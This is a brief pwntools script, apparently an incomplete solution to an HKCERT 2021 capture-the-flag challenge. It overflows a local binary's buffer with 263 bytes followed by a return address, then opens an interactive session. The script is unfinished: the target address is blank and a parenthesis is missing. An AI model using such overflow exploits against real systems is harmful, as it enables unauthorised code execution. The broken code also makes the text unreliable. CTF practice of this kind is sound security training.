from pwn import *
## p = remote("chalp.hkcert21.pwnable.hk",28028)
p = process("a.out")
p.recvuntil("service.")
gs_function=
p.sendline(b"a"*263+p64(gs_function)
p.interactive()
